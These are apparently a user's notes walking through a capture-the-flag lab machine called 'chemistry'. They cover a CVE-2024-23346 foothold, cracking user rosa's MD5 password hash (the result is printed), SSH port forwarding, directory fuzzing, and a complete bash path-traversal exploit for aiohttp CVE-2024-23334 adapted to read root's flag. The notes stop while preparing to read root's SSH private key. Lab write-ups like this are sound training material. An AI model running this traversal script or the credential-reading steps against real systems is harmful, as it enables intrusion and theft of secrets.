

to get usershell -

$python -m venv .venv - create python virtual env 


use https://github.com/Sanity-Archive/CVE-2024-23346 to take adv of  CVE-2024-23346

get a shell as app

python3 -c "import sqlite3; conn = sqlite3.connect('database.db'); [print(row) for row in conn.execute('SELECT * FROM user LIMIT 10')]" 

One line python command to read a sqlite3 database  - to find user rosa with an md5 hash 

https://crackstation.net/

|Hash|Type|Result|
|---|---|---|
|63ed86ee9f624c7b14f1d4f43dc251a5|md5|unicorniosrosados|

This allows us to get a ssh connection as rosa


```
rosa@chemistry:~$ ss -tulp
Netid             State               Recv-Q              Send-Q                           Local Address:Port                               Peer Address:Port             Process             
udp               UNCONN              0                   0                                127.0.0.53%lo:domain                                  0.0.0.0:*                                    
udp               UNCONN              0                   0                                      0.0.0.0:bootpc                                  0.0.0.0:*                                    
tcp               LISTEN              0                   128                                    0.0.0.0:5000                                    0.0.0.0:*                                    
tcp               LISTEN              0                   128                                  127.0.0.1:http-alt                                0.0.0.0:*                                    
tcp               LISTEN              0                   4096                             127.0.0.53%lo:domain                                  0.0.0.0:*                                    
tcp               LISTEN              0                   128                                    0.0.0.0:ssh                                     0.0.0.0:*                                    
tcp               LISTEN              0                   128                                       [::]:ssh                                        [::]:*                           
```

This command shows us a server listening on http-alt (8080)

curl -v 127.0.0.1:8080 shows us < Server: Python/3.9 aiohttp/3.9.11 the server is running aiohttp/3.9.11 which is vulnerable to 

https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh 

```
#!/bin/bash

url="http://localhost:8081"
string="../"
payload="/static/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```
to modify this exploit we need to know the value of payload

With an ssh connection and a pass word we can forward that port with SSH so we can access it from our local machine
`ssh -L 8080:127.0.0.1:8080 -N -vv rosa@10.129.231.170` - this needs to be run from our

we do this so we can use tools installed on our local machine to do some directory fuzzing to see that we need to modify the script to use

We use https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/server.py that server config to see we need to find the /static on our running server 






 we run some directory fuzzing commands to find that the static content we needed to modify the script was in the /assets folder
` ffuf -u http://localhost:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt `

`assets                  [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 55ms]`

From there we can modify exploit.sh
```
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="root/root.txt" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done

```

we changed the value of url to be on port 8080 instead of 8081. We change the value of payload to be /assets/ and the value of file to be root/root.txt. this modified exploit will read the value of root.txt 



To gain access to the target as root user, we read the SSH private key located in
/root/.ssh/id_rsa and then use it to log in to the target via SSH. Change the file in the
exploit.sh to the following: